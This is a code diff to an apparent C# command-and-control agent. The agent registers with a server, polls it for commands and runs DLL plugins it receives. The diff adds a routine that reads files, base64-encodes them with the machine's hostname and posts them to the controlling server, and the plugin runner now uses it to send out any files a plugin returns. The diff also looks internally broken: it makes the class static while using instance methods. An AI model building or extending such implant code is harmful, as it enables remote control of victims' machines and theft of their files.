@@ -15,11 +15,11 @@ using System.Diagnostics;
 
 namespace client
 {
-    public class Client
+    public static class Client
     {   
-        
+        public static Communicator comm;
         // tasks enables threading for now
-        static async Task Main(string[] args)
+        public static async Task Main(string[] args)
         {
             //takes command line args of IP and Port
             int tport;
@@ -36,7 +36,8 @@ namespace client
                 Console.WriteLine("No arguments provided, using defaults...");
             }
 
-            Communicator comm = new Communicator(tipaddress, tport);
+            comm = new Communicator(tipaddress, tport);
+
             //await Communicator.GetRequest(comm.host);
             await comm.RegisterAgent();
 
@@ -110,6 +111,33 @@ namespace client
 
         }
 
+        public async Task SendFileToServer(string filepath, string filename)
+        {
+            Console.WriteLine("sending?");
+            // echo filepath
+            Console.WriteLine(filepath);
+            // file to base64
+            byte[] bytes = File.ReadAllBytes(filepath);
+            string file = Convert.ToBase64String(bytes);
+
+            // echo file to console
+            Console.WriteLine(file);
+
+            // get machine hostname
+            string hostname = System.Environment.MachineName;
+
+            // file to server
+            string responseBody = $"{{\"hostname\": \"{hostname}\",\"file\": \"{file}\",\"filename\": \"{filename}\"}}";
+            Console.WriteLine($"body: {responseBody}");
+            (bool l, string a) = await BuildAndSendHTTPRequest(new StringContent(responseBody));
+
+            if(l){
+                Console.WriteLine(a);
+            }else{
+                Console.WriteLine("failed to send file");
+            }
+        }
+
         public async Task GetCommand()
         {
             // get commands from server
@@ -161,19 +189,35 @@ namespace client
             /*
             * this should search through all classes to find the Main or other starting method
             */
-            string ret = "Failed to run plugin";
             foreach(Type oType in asm.GetTypes()){
                 try{
                     dynamic c = Activator.CreateInstance(oType);
                     var methods = oType.GetMethods();
                     var method = oType.GetMethod("PluginMain");
-                    ret = method.Invoke(c, null);
-                    return ret;
+                    IDictionary<string, dynamic> dll_return = method.Invoke(c, null);
+
+                    if(dll_return["ExitCode"] == 0){
+                        // send files API
+                        if (dll_return.TryGetValue("Files", out dynamic files)) {
+                            Console.WriteLine("Sending files");
+                            for (int i = 0; i < files.Length; i++) 
+                            {
+                                this.SendFileToServer(files[i], Path.GetFileName(files[i]));
+                            }
+                        }
+                        
+
+                        string exit_message = dll_return["ExitMessage"];
+                        return $"Plugin ran successfully: {exit_message}";
+                    }else{
+                        string exit_message = dll_return["ExitMessage"];
+                        return $"Plugin failed to run: {exit_message}";
+                    }
                 } catch {
                     continue;
                 }
             }
-            return ret;
+            return "Failed to run plugin!";
             //File.WriteAllBytes("./file", Base64DecodeFile(command));
             //return "did it";
         }
